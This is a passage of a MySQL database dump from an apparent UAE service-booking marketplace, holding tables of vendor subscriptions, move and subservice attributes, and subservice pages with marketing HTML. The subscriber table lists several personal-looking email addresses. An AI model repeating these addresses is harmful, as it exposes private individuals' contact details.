  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `subscribes`
--

INSERT INTO `subscribes` (`id`, `email`, `created_at`, `updated_at`) VALUES
(8, 'mayudin.hnrtechnologies@gmail.com', '2024-01-02 00:00:00', '2024-01-02 11:53:58'),
(10, 'devang@gmail.com', '2024-01-17 00:00:00', '2024-01-17 13:28:22'),
(11, 'eholmesie1997@gmail.com', '2024-05-23 00:00:00', '2024-05-23 22:48:59'),
(12, 'eholmesie1997@gmail.com', '2024-05-23 00:00:00', '2024-05-23 22:49:06');

-- --------------------------------------------------------

--
-- Table structure for table `subscription`
--

CREATE TABLE `subscription` (
  `id` int(11) NOT NULL,
  `vendor_id` bigint(20) NOT NULL,
  `subscription_name` varchar(255) NOT NULL,
  `subscription_id` int(11) NOT NULL,
  `country` int(11) NOT NULL,
  `state` int(11) NOT NULL,
  `city` varchar(255) NOT NULL,
  `services` varchar(255) NOT NULL,
  `sub_service` varchar(255) NOT NULL,
  `total` bigint(20) NOT NULL,
  `type_of_subscription` int(11) DEFAULT NULL COMMENT '0=package,1=inquiry',
  `startdate` datetime NOT NULL,
  `enddate` datetime NOT NULL,
  `added_date` datetime NOT NULL,
  `no_of_inquiry_package` int(11) DEFAULT NULL,
  `price_package` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `subscription`
--

INSERT INTO `subscription` (`id`, `vendor_id`, `subscription_name`, `subscription_id`, `country`, `state`, `city`, `services`, `sub_service`, `total`, `type_of_subscription`, `startdate`, `enddate`, `added_date`, `no_of_inquiry_package`, `price_package`) VALUES
(10, 48, 'Based on Services Leads', 1, 22, 21, '15', '16', '17,18', 2700, NULL, '2023-12-09 06:44:51', '2024-01-08 06:44:51', '2023-12-09 06:44:51', NULL, NULL),
(16, 48, 'Based on Services Leads', 1, 22, 21, '15', '16', '17,18', 1700, NULL, '2023-12-09 11:51:52', '2024-01-08 11:51:52', '2023-12-09 11:51:52', NULL, NULL),
(18, 49, 'Based on Services Leads', 1, 22, 21, '15', '16', '17', 1200, 0, '2023-12-11 05:09:50', '2024-01-10 05:09:50', '2023-12-11 05:09:50', NULL, NULL),
(19, 49, 'Based on Services Leads', 1, 22, 21, '15', '16', '17,18', 1700, 0, '2023-12-11 05:11:47', '2024-01-10 05:11:47', '2023-12-11 05:11:47', NULL, NULL),
(20, 66, 'Based on Services Leads', 1, 22, 21, '15', '16', '18', 500, 0, '2023-12-15 11:42:04', '2024-01-14 11:42:04', '2023-12-15 11:42:04', NULL, NULL),
(21, 67, 'Based on Services Leads', 1, 22, 21, '15', '16', '17', 1200, 0, '2023-12-22 04:54:35', '2024-01-21 04:54:35', '2023-12-22 04:54:35', NULL, NULL),
(22, 67, 'Based on Services Leads', 1, 5, 3, '2', '16', '18', 500, 0, '2023-12-22 04:54:48', '2024-01-21 04:54:48', '2023-12-22 04:54:48', NULL, NULL),
(23, 68, 'Based on Services Leads', 1, 22, 21, '15', '16', '17', 1200, 0, '2023-12-22 04:55:14', '2024-01-21 04:55:14', '2023-12-22 04:55:14', NULL, NULL),
(24, 68, 'Based on Services Leads', 1, 22, 21, '15', '16', '18', 500, 0, '2023-12-22 04:55:34', '2024-01-21 04:55:34', '2023-12-22 04:55:34', NULL, NULL),
(25, 69, 'Based on Services Leads', 1, 22, 21, '15', '16', '17,18', 1700, 0, '2023-12-22 05:52:45', '2024-01-21 05:52:45', '2023-12-22 05:52:45', NULL, NULL),
(26, 64, 'Based on Services Leads', 1, 22, 21, '15', '16', '18', 500, 0, '2023-12-24 06:45:50', '2024-01-23 06:45:50', '2023-12-24 06:45:50', NULL, NULL),
(27, 70, 'Based on Services Leads', 1, 22, 21, '15', '16,18', '17,18', 1700, 0, '2024-01-10 13:34:26', '2024-02-09 13:34:26', '2024-01-10 13:34:26', NULL, NULL),
(28, 71, 'Based on Services Leads', 1, 22, 21, '15', '22', '21', 150, 0, '2024-01-17 04:37:55', '2024-02-16 04:37:55', '2024-01-17 04:37:55', NULL, NULL),
(29, 73, 'Based on Services Leads', 1, 22, 23, '17', '30,32', '26,27,28,29,30,31,32', 46, 0, '2024-03-02 06:49:53', '2024-04-01 06:49:53', '2024-03-02 06:49:53', NULL, NULL),
(30, 72, 'Based on Services Leads', 1, 22, 23, '17', '30,32', '26,29,30', 3, 0, '2024-03-03 06:51:05', '2024-04-02 06:51:05', '2024-03-03 06:51:05', NULL, NULL),
(31, 73, 'Based on Services Leads', 1, 22, 23, '17', '43', '60', 1500, 0, '2024-03-16 07:14:52', '2024-04-15 07:14:52', '2024-03-16 07:14:52', NULL, NULL),
(32, 72, 'Based on Services Leads', 1, 22, 25, '20', '30,32', '26,27,28,29,30', 5, 0, '2024-03-16 08:14:25', '2024-04-15 08:14:25', '2024-03-16 08:14:25', NULL, NULL),
(33, 73, 'Based on Services Leads', 1, 22, 23, '17', '30', '26', 1, 0, '2024-03-16 09:52:12', '2024-04-15 09:52:12', '2024-03-16 09:52:12', NULL, NULL),
(34, 73, 'Based on Services Leads', 1, 22, 25, '20', '30,32', '26,28', 2, 0, '2024-03-18 05:07:14', '2024-04-17 05:07:14', '2024-03-18 05:07:14', NULL, NULL),
(35, 73, 'Based on Services Leads', 1, 22, 25, '20,21', '32', '29,33', 2, 0, '2024-03-18 05:09:28', '2024-04-17 05:09:28', '2024-03-18 05:09:28', NULL, NULL),
(36, 73, 'Based on Listing Criteria', 3, 22, 25, '20,21', '', '', 100, 0, '2024-03-18 05:10:22', '2024-04-17 05:10:22', '2024-03-18 05:10:22', NULL, NULL),
(37, 73, 'Based on Services Leads', 1, 22, 23, '17', '43', '60', 1500, 0, '2024-03-22 11:50:14', '2024-04-21 11:50:14', '2024-03-22 11:50:14', NULL, NULL),
(38, 74, 'Based on Services Leads', 1, 22, 23, '17', '30', '23', 1, 0, '2024-04-27 06:16:56', '2024-05-27 06:16:56', '2024-04-27 06:16:56', NULL, NULL),
(39, 73, 'Based on Services Leads', 1, 22, 25, '20', '30', '23', 1, 0, '2024-04-27 06:37:48', '2024-05-27 06:37:48', '2024-04-27 06:37:48', NULL, NULL),
(40, 75, 'Based on Services Leads', 1, 22, 25, '20', '30', '23', 1, 0, '2024-04-29 09:53:10', '2024-05-29 09:53:10', '2024-04-29 09:53:10', NULL, NULL),
(41, 75, 'Based on Services Leads', 1, 22, 25, '20', '44', '61', 150, 0, '2024-04-29 10:43:46', '2024-05-29 10:43:46', '2024-04-29 10:43:46', NULL, NULL),
(42, 75, 'Based on Services Leads', 1, 22, 25, '20', '45', '28', 1, 0, '2024-04-29 10:55:12', '2024-05-29 10:55:12', '2024-04-29 10:55:12', NULL, NULL),
(43, 75, 'Based on Services Leads', 1, 22, 25, '20', '45', '30', 1, 0, '2024-04-29 11:00:39', '2024-05-29 11:00:39', '2024-04-29 11:00:39', NULL, NULL),
(44, 75, 'Based on Services Leads', 1, 22, 25, '20', '45', '33', 1, 0, '2024-04-29 11:10:18', '2024-05-29 11:10:18', '2024-04-29 11:10:18', NULL, NULL),
(45, 75, 'Based on Services Leads', 1, 22, 25, '21', '30', '31', 1, 0, '2024-05-01 11:30:32', '2024-05-31 11:30:32', '2024-05-01 11:30:32', NULL, NULL),
(46, 78, 'Based on Services Leads', 1, 22, 23, '17', '32', '29,34', 2, 0, '2024-05-18 05:53:47', '2024-06-17 05:53:47', '2024-05-18 05:53:47', NULL, NULL),
(47, 77, 'Based on Listing Criteria', 3, 22, 23, '17', '', '', 100, 0, '2024-05-18 05:58:52', '2024-06-17 05:58:52', '2024-05-18 05:58:52', NULL, NULL),
(48, 77, 'Based on Services Leads', 1, 22, 23, '17', '30', '26,27', 2, 0, '2024-05-18 05:59:15', '2024-06-17 05:59:15', '2024-05-18 05:59:15', NULL, NULL),
(49, 78, 'Based on Services Leads', 1, 22, 23, '17', '45', '30', 1, 0, '2024-05-18 06:12:01', '2024-06-17 06:12:01', '2024-05-18 06:12:01', NULL, NULL),
(50, 79, 'Based on Services Leads', 1, 22, 23, '17', '30', '23,26,27,31,32', 44, 0, '2024-05-18 11:12:22', '2024-06-17 11:12:22', '2024-05-18 11:12:22', NULL, NULL),
(51, 73, 'Based on Services Leads', 1, 22, 23, '17', '44,30', '62,64', 270, 0, '2024-05-21 11:57:44', '2024-06-20 11:57:44', '2024-05-21 11:57:44', NULL, NULL),
(52, 73, 'Based on Services Leads', 1, 22, 23, '17', '30', '23,26', 60, 0, '2024-05-22 11:26:50', '2024-06-21 11:26:50', '2024-05-22 11:26:50', NULL, NULL),
(53, 75, 'Based on Services Leads', 1, 22, 25, '20', '30', '23', 1, 0, '2024-05-29 11:07:44', '2024-06-28 11:07:44', '2024-05-29 11:07:44', NULL, NULL),
(54, 98, 'Based on Listing Criteria', 3, 22, 23, '17', '', '', 100, 0, '2024-05-29 19:46:16', '2024-06-28 19:46:16', '2024-05-29 19:46:16', NULL, NULL),
(55, 98, 'Based on Listing Criteria', 3, 22, 23, '17', '', '', 300, 0, '2024-05-29 19:47:18', '2024-06-28 19:47:18', '2024-05-29 19:47:18', NULL, NULL),
(56, 73, 'Based on Services Leads', 1, 22, 25, '20', '30,44', '23,26,27,31,32,53', 25, 0, '2024-06-04 14:02:30', '2024-07-04 14:02:30', '2024-06-04 14:02:30', NULL, NULL),
(57, 73, 'Based on Services Leads', 1, 22, 26, '22', '44', '62,63,64,65,66', 640, 0, '2024-06-04 14:03:10', '2024-07-04 14:03:10', '2024-06-04 14:03:10', NULL, NULL),
(58, 77, 'Based on Services Leads', 1, 22, 26, '22', '30,44', '23,61', 151, 0, '2024-06-05 12:19:26', '2024-07-05 12:19:26', '2024-06-05 12:19:26', NULL, NULL),
(59, 91, 'Based on Services Leads', 1, 22, 23, '17', '30,44', '23,26,27,31,32,53,61,62,63,64,65,66,67,69', 1435, 0, '2024-06-06 12:44:16', '2024-07-06 12:44:16', '2024-06-06 12:44:16', NULL, NULL),
(60, 106, 'Based on Services Leads', 1, 22, 23, '17', '30', '23', 25, 0, '2024-06-15 14:02:34', '2024-07-15 14:02:34', '2024-06-15 14:02:34', NULL, NULL),
(61, 73, 'Based on Services Leads', 1, 22, 23, '17', '30', '23', 100, 0, '2024-06-20 09:37:03', '2024-07-20 09:37:03', '2024-06-20 09:37:03', NULL, NULL),
(62, 73, 'Based on Services Leads', 1, 22, 23, '17', '30', '23', 100, 0, '2024-06-20 10:27:59', '2024-07-20 10:27:59', '2024-06-20 10:27:59', NULL, NULL),
(63, 73, 'Based on Services Leads', 1, 22, 23, '17', '30', '23', 100, 0, '2024-06-20 10:29:20', '2024-07-20 10:29:20', '2024-06-20 10:29:20', NULL, NULL),
(64, 73, 'Based on Services Leads', 1, 22, 23, '17', '30', '23', 5000, NULL, '2024-06-22 11:05:31', '2024-07-22 11:05:31', '2024-06-22 11:05:31', 50, 100);

-- --------------------------------------------------------

--
-- Table structure for table `subscription_international_move_attribute`
--

CREATE TABLE `subscription_international_move_attribute` (
  `id` int(11) NOT NULL,
  `subscription_id` int(11) DEFAULT NULL,
  `form_id` int(11) DEFAULT NULL,
  `form_attributes_id` int(11) DEFAULT NULL,
  `more_form_attributes_id` int(11) DEFAULT NULL,
  `local_no_of_inquiry` int(11) DEFAULT NULL,
  `local_move_charge` int(11) DEFAULT NULL,
  `local_service_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `subscription_international_move_attribute`
--

INSERT INTO `subscription_international_move_attribute` (`id`, `subscription_id`, `form_id`, `form_attributes_id`, `more_form_attributes_id`, `local_no_of_inquiry`, `local_move_charge`, `local_service_id`) VALUES
(1, 63, 20, 56, 20, 2, 2, 30),
(2, 63, 20, 56, 21, 0, 0, 30),
(3, 63, 20, 56, 22, 0, 0, 30),
(4, 63, 20, 56, 23, 0, 0, 30),
(5, 63, 20, 56, 24, 0, 0, 30),
(6, 63, 20, 57, 25, 9, 9, 30),
(7, 63, 20, 57, 26, 0, 0, 30),
(8, 63, 20, 57, 27, 0, 0, 30),
(9, 63, 20, 57, 28, 0, 0, 30),
(10, 63, 20, 73, 36, 5, 5, 30),
(11, 63, 20, 73, 37, 0, 0, 30),
(12, 63, 20, 496, 38, 7, 7, 30),
(13, 63, 20, 496, 39, 0, 0, 30),
(14, 64, 20, 56, 20, 0, 0, 30),
(15, 64, 20, 56, 21, 0, 0, 30),
(16, 64, 20, 56, 22, 0, 0, 30),
(17, 64, 20, 56, 23, 0, 0, 30),
(18, 64, 20, 56, 24, 0, 0, 30),
(19, 64, 20, 57, 25, 0, 0, 30),
(20, 64, 20, 57, 26, 0, 0, 30),
(21, 64, 20, 57, 27, 0, 0, 30),
(22, 64, 20, 57, 28, 0, 0, 30),
(23, 64, 20, 73, 36, 0, 0, 30),
(24, 64, 20, 73, 37, 0, 0, 30),
(25, 64, 20, 496, 38, 0, 0, 30),
(26, 64, 20, 496, 39, 0, 0, 30);

-- --------------------------------------------------------

--
-- Table structure for table `subscription_local_move_attribute`
--

CREATE TABLE `subscription_local_move_attribute` (
  `id` int(11) NOT NULL,
  `subscription_id` int(11) DEFAULT NULL,
  `form_id` int(11) DEFAULT NULL,
  `form_attributes_id` int(11) DEFAULT NULL,
  `more_form_attributes_id` int(11) DEFAULT NULL,
  `local_no_of_inquiry` int(11) DEFAULT NULL,
  `local_move_charge` int(11) DEFAULT NULL,
  `local_service_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `subscription_local_move_attribute`
--

INSERT INTO `subscription_local_move_attribute` (`id`, `subscription_id`, `form_id`, `form_attributes_id`, `more_form_attributes_id`, `local_no_of_inquiry`, `local_move_charge`, `local_service_id`) VALUES
(1, 61, 20, 56, 20, 1, 1, 30),
(2, 61, 20, 56, 21, 2, 2, 30),
(3, 61, 20, 56, 22, 3, 3, 30),
(4, 61, 20, 56, 23, 4, 4, 30),
(5, 61, 20, 56, 24, 0, 0, 30),
(6, 61, 20, 57, 25, 6, 6, 30),
(7, 61, 20, 57, 26, 7, 7, 30),
(8, 61, 20, 57, 27, 0, 0, 30),
(9, 61, 20, 57, 28, 9, 9, 30),
(10, 61, 20, 73, 36, 10, 10, 30),
(11, 61, 20, 73, 37, 0, 0, 30),
(12, 61, 20, 496, 38, 12, 12, 30),
(13, 61, 20, 496, 39, 0, 0, 30),
(14, 62, 20, 56, 20, 1, 1, 30),
(15, 62, 20, 56, 21, 0, 0, 30),
(16, 62, 20, 56, 22, 2, 2, 30),
(17, 62, 20, 56, 23, 0, 0, 30),
(18, 62, 20, 56, 24, 0, 0, 30),
(19, 62, 20, 57, 25, 3, 3, 30),
(20, 62, 20, 57, 26, 0, 0, 30),
(21, 62, 20, 57, 27, 0, 0, 30),
(22, 62, 20, 57, 28, 0, 0, 30),
(23, 62, 20, 73, 36, 4, 4, 30),
(24, 62, 20, 73, 37, 0, 0, 30),
(25, 62, 20, 496, 38, 5, 5, 30),
(26, 62, 20, 496, 39, 0, 0, 30);

-- --------------------------------------------------------

--
-- Table structure for table `subscription_subservice_attribute`
--

CREATE TABLE `subscription_subservice_attribute` (
  `id` int(11) NOT NULL,
  `subscription_id` int(11) NOT NULL,
  `service_id` int(11) NOT NULL,
  `subservice_id` int(11) NOT NULL,
  `charge` bigint(20) NOT NULL,
  `no_of_inquiry` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `subscription_subservice_attribute`
--

INSERT INTO `subscription_subservice_attribute` (`id`, `subscription_id`, `service_id`, `subservice_id`, `charge`, `no_of_inquiry`) VALUES
(15, 10, 16, 17, 1200, 10),
(16, 10, 16, 18, 1500, 10),
(22, 16, 16, 17, 1200, 10),
(23, 16, 16, 18, 500, 50),
(25, 18, 16, 17, 1200, 10),
(26, 19, 16, 17, 1200, 10),
(27, 19, 16, 18, 500, 50),
(28, 20, 16, 18, 500, 50),
(29, 21, 16, 17, 1200, 10),
(30, 22, 16, 18, 500, 50),
(31, 23, 16, 17, 1200, 10),
(32, 24, 16, 18, 500, 50),
(33, 25, 16, 17, 1200, 10),
(34, 25, 16, 18, 500, 50),
(35, 26, 16, 18, 500, 50),
(36, 27, 16, 17, 1200, 10),
(37, 27, 16, 18, 500, 50),
(38, 28, 22, 21, 150, 10),
(39, 29, 30, 26, 1, 1),
(40, 29, 30, 27, 1, 1),
(41, 29, 32, 28, 1, 1),
(42, 29, 32, 29, 1, 1),
(43, 29, 32, 30, 1, 1),
(44, 29, 30, 31, 1, 1),
(45, 29, 30, 32, 40, 1),
(46, 30, 30, 26, 1, 1),
(47, 30, 32, 29, 1, 1),
(48, 30, 32, 30, 1, 1),
(49, 31, 43, 60, 1500, 15),
(50, 32, 30, 26, 1, 1),
(51, 32, 30, 27, 1, 1),
(52, 32, 32, 28, 1, 1),
(53, 32, 32, 29, 1, 1),
(54, 32, 32, 30, 1, 1),
(55, 33, 30, 26, 1, 1),
(56, 34, 30, 26, 1, 1),
(57, 34, 32, 28, 1, 1),
(58, 35, 32, 29, 1, 1),
(59, 35, 32, 33, 1, 1),
(60, 37, 43, 60, 1500, 15),
(61, 38, 30, 23, 1, 1),
(62, 39, 30, 23, 1, 1),
(63, 40, 30, 23, 1, 1),
(64, 41, 44, 61, 150, 10),
(65, 42, 45, 28, 1, 1),
(66, 43, 45, 30, 1, 1),
(67, 44, 45, 33, 1, 1),
(68, 45, 30, 31, 1, 1),
(69, 46, 32, 29, 1, 1),
(70, 46, 32, 34, 1, 1),
(71, 48, 30, 26, 1, 1),
(72, 48, 30, 27, 1, 1),
(73, 49, 45, 30, 1, 1),
(74, 50, 30, 23, 1, 1),
(75, 50, 30, 26, 1, 1),
(76, 50, 30, 27, 1, 1),
(77, 50, 30, 31, 1, 1),
(78, 50, 30, 32, 40, 1),
(79, 51, 44, 62, 150, 10),
(80, 51, 44, 64, 120, 10),
(81, 52, 30, 23, 50, 1),
(82, 52, 30, 26, 10, 1),
(83, 53, 30, 23, 1, 1),
(84, 56, 30, 23, 1, 1),
(85, 56, 30, 26, 1, 1),
(86, 56, 30, 27, 1, 1),
(87, 56, 30, 31, 1, 1),
(88, 56, 30, 32, 20, 1),
(89, 56, 30, 53, 1, 1),
(90, 57, 44, 62, 150, 10),
(91, 57, 44, 63, 120, 10),
(92, 57, 44, 64, 120, 10),
(93, 57, 44, 65, 150, 10),
(94, 57, 44, 66, 100, 10),
(95, 58, 30, 23, 1, 1),
(96, 58, 44, 61, 150, 10),
(97, 59, 30, 23, 1, 1),
(98, 59, 30, 26, 1, 1),
(99, 59, 30, 27, 1, 1),
(100, 59, 30, 31, 1, 1),
(101, 59, 30, 32, 40, 1),
(102, 59, 30, 53, 1, 1),
(103, 59, 44, 61, 150, 10),
(104, 59, 44, 62, 150, 10),
(105, 59, 44, 63, 120, 10),
(106, 59, 44, 64, 120, 10),
(107, 59, 44, 65, 150, 10),
(108, 59, 44, 66, 100, 10),
(109, 59, 30, 67, 200, 20),
(110, 59, 30, 69, 400, 40),
(111, 60, 30, 23, 25, 1),
(112, 61, 30, 23, 100, 1),
(113, 62, 30, 23, 100, 1),
(114, 63, 30, 23, 100, 1),
(115, 64, 30, 23, 10, 10);

-- --------------------------------------------------------

--
-- Table structure for table `subservices`
--

CREATE TABLE `subservices` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `serviceid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `subservicename` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `page_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci,
  `top_description` text COLLATE utf8mb4_unicode_ci,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `banner_image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `charge` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `no_of_inquiry` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `is_bookable` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '0-booknow,1-enquiry',
  `servicepercentage` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `set_order` int(11) DEFAULT NULL,
  `form_fields` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `form_fields_two` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `subservices`
--

INSERT INTO `subservices` (`id`, `serviceid`, `subservicename`, `page_url`, `description`, `top_description`, `image`, `banner_image`, `charge`, `no_of_inquiry`, `is_bookable`, `servicepercentage`, `set_order`, `form_fields`, `form_fields_two`, `created_at`, `updated_at`) VALUES
(23, '30', 'Apartment Moving', 'apartment-moving', '<h4><strong>How it works</strong></h4><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><h4><strong>Specify your Service Requirements</strong></h4><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your moving needs.</p><h4><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></h4><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><h4><strong>Leave the rest to us</strong></h4><p>Once you’ve chosen a company, confirm the details of your move with them. Then, simply relax and unwind while our trusted vendor takes care of the job!</p><h4><strong>Movers in Dubai</strong></h4><p>It is easy to feel overwhelmed by the long list of tasks that need to be taken care of while moving in Dubai. From packing items to moving them to the right rooms in your new home and then unpacking everything, the process involves a lot of challenging steps. The easiest way to make the moving process hassle-free is to find and get in touch with the best Dubai movers and packers on ServiceMarket.<br>&nbsp;</p>', '<p><strong>Moving in the UAE</strong></p><p>Booking your moving service has never been easier. Skip the daunting task of searching for numerous vendors – at VendorsCity, we simplify the process. Effortlessly obtain 5 free quotes from trusted and professional vendors catering to various needs. Alternatively, explore our diverse range of packages tailored to suit your requirements, be it an&nbsp;<a href=\"https://www.vendorscity.com/package-lists/office-moving\"><strong>office move</strong></a>,&nbsp;<a href=\"https://www.vendorscity.com/package-lists/apartment-moving\"><strong>apartment move</strong></a>, or&nbsp;<a href=\"https://www.vendorscity.com/package-lists/villa-moving\"><strong>villa move</strong></a>. Our carefully selected vendors boast trustworthiness and professionalism. Choose ease and reliability with us as you embark on your moving adventure in the UAE.</p>', '1716789663Apartment-Moving.jpg', '1717070352Apartment-Moving-min.jpg', '100', '1', '1', NULL, 1, '17', '57', '2024-02-15 11:14:30', '2024-03-03 02:01:23'),
(26, '30', 'Villa Moving', 'villa-moving', '<h4><strong>How it works</strong></h4><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><h4><strong>Specify your Service Requirements</strong></h4><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your moving needs.</p><h4><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></h4><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><h4><strong>Leave the rest to us</strong></h4><p>Once you’ve chosen a company, confirm the details of your move with them. Then, simply relax and unwind while our trusted vendor takes care of the job!</p><h4><strong>Movers in Dubai</strong></h4><p>It is easy to feel overwhelmed by the long list of tasks that need to be taken care of while moving in Dubai. From packing items to moving them to the right rooms in your new home and then unpacking everything, the process involves a lot of challenging steps. The easiest way to make the moving process hassle-free is to find and get in touch with the best Dubai movers and packers on ServiceMarket.<br>&nbsp;</p>', '<p><strong>Moving in the UAE</strong></p><p>Booking your moving service has never been easier. Skip the daunting task of searching for numerous vendors – at VendorsCity, we simplify the process. Effortlessly obtain 5 free quotes from trusted and professional vendors catering to various needs. Alternatively, explore our diverse range of packages tailored to suit your requirements, be it an&nbsp;<strong>office move</strong>,&nbsp;<strong>apartment move</strong>, or&nbsp;<strong>villa move</strong>. Our carefully selected vendors boast trustworthiness and professionalism. Choose ease and reliability with us as you embark on your moving adventure in the UAE.</p>', '1716789643Villa-Moving.jpg', '1717070338Villa-MOving-min.jpg', '1', '1', '1', '20', 2, NULL, NULL, '2024-02-26 00:08:07', '2024-02-26 06:54:38'),
(28, '45', 'Home Cleaning', 'home-cleaning', NULL, NULL, '1708950205Screenshot-2024-02-26-at-4.23.15 PM.png', '1717667165Cleaning-Banner-min-(1).jpg', '1', '1', '0', '20', 0, '32,33,34,35,36,61,62', NULL, '2024-02-26 00:28:00', '2024-02-26 06:53:25'),
(29, '45', 'Deep Cleaning', 'deep-cleaning', '<p>Go beyond the surface with our deep cleaning services, designed to eliminate hidden dirt and grime. We leave no corner untouched, ensuring a thorough cleanse that revitalizes your space.</p>', NULL, '1708950172Screenshot-2024-02-26-at-4.22.41 PM.png', '17183468281_vdENfM8vyziC41XhrcckIg.jpg', '1', '1', '0', '20', 0, NULL, NULL, '2024-02-26 00:32:02', '2024-02-26 06:52:52'),
(30, '45', 'Office Cleaning', 'office-cleaning', '<p>Boost productivity and create a professional ambiance with our office cleaning services. We tailor our cleaning solutions to meet the unique needs of your workspace, maintaining a clean and organized office for your team and clients.</p>', NULL, '1708950121Screenshot-2024-02-26-at-4.21.44 PM.png', '1717667150Cleaning-Banner-min-(1).jpg', '1', '1', '0', '20', 0, '32,33,34,35,36,61,62', NULL, '2024-02-26 00:35:28', '2024-02-26 06:52:01'),
(31, '30', 'Vehicle Shipping', 'vehicle-shipping', '<h4><strong>How it works</strong></h4><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><h4><strong>Specify your Service Requirements</strong></h4><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your moving needs.</p><h4><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></h4><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><h4><strong>Leave the rest to us</strong></h4><p>Once you’ve chosen a company, confirm the details of your move with them. Then, simply relax and unwind while our trusted vendor takes care of the job!</p><h4><strong>Movers in Dubai</strong></h4><p>It is easy to feel overwhelmed by the long list of tasks that need to be taken care of while moving in Dubai. From packing items to moving them to the right rooms in your new home and then unpacking everything, the process involves a lot of challenging steps. The easiest way to make the moving process hassle-free is to find and get in touch with the best Dubai movers and packers on ServiceMarket.</p>', '<p><strong>Moving in the UAE</strong></p><p>Booking your moving service has never been easier. Skip the daunting task of searching for numerous vendors – at VendorsCity, we simplify the process. Effortlessly obtain 5 free quotes from trusted and professional vendors catering to various needs. Alternatively, explore our diverse range of packages tailored to suit your requirements, be it an&nbsp;<strong>office move</strong>,&nbsp;<strong>apartment move</strong>, or&nbsp;<strong>villa move</strong>. Our carefully selected vendors boast trustworthiness and professionalism. Choose ease and reliability with us as you embark on your moving adventure in the UAE.</p>', '1716789591Vehicle-Shipping.jpg', '1717070299Vehicle-Shipping-min.jpg', '1', '1', '1', '20', 7, '32,39,40,41,42,59,60,64,65,66', '', '2024-02-26 00:40:26', '2024-02-26 06:51:18'),
(33, '45', 'Carpet Cleaning', 'carpet-cleaning', NULL, NULL, '1708949999Screenshot-2024-02-26-at-4.19.49 PM.png', '1717667132Cleaning-Banner-min-(1).jpg', '1', '1', '1', '20', 0, '32,37,38,58,61,62', NULL, '2024-02-26 01:37:30', '2024-02-26 06:49:59'),
(34, '32', 'Window Cleaning', 'window-cleaning', '<p>Enjoy crystal-clear views with our professional window cleaning services. Our expert team ensures streak-free windows, enhancing the aesthetics of your home or office.</p>', NULL, '1708949955Screenshot-2024-02-26-at-4.19.03 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 01:39:43', '2024-02-26 06:49:15'),
(35, '32', 'Laundry Services', 'laundry-services', NULL, NULL, '1708949913Screenshot-2024-02-26-at-4.18.24 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 01:42:13', '2024-02-26 06:48:33'),
(36, '32', 'Pool Cleaning', 'pool-cleaning', NULL, NULL, '1708949884Screenshot-2024-02-26-at-4.17.52 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 01:43:14', '2024-02-26 06:48:04'),
(37, '32', 'Car Cleaning', 'car-cleaning', '<p>Your vehicle deserves the best care. Our car cleaning services promise a meticulous interior and exterior cleaning, leaving your car looking and smelling as good as new.</p>', NULL, '1708949855Screenshot-2024-02-26-at-4.17.25 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:31:27', '2024-02-26 06:47:35'),
(38, '33', 'AC Installation', 'ac-installation', '<p>Entrust us with the installation of your air conditioning units, ensuring precise and efficient setup for optimal performance. Our skilled technicians handle all types of AC systems, from split units to central cooling solutions.</p>', NULL, '1708949826Screenshot-2024-02-26-at-4.16.55 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:35:43', '2024-02-26 06:47:06'),
(39, '33', 'AC Repair & Maintainance', 'ac-repair-maintainance', '<p>Keep your AC systems running smoothly with our expert repair and maintenance services. Our experienced technicians diagnose issues promptly and implement effective solutions, ensuring your units operate at peak efficiency.</p>', NULL, '1708934894Untitled-design-46.png.webp', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:38:14', '2024-02-26 02:45:19'),
